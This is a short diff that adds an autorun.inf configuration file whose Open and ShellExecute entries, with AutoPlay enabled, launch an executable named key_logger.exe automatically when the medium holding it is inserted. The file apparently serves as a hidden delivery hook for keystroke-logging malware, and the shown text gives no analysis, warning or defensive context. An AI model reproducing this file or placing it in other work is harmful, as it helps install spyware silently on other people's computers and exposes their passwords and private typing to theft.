@@ -1,0 +1,4 @@
+[autorun]
+Open=key_logger.exe
+ShellExecute=key_logger.exe
+UseAutoPlay=1
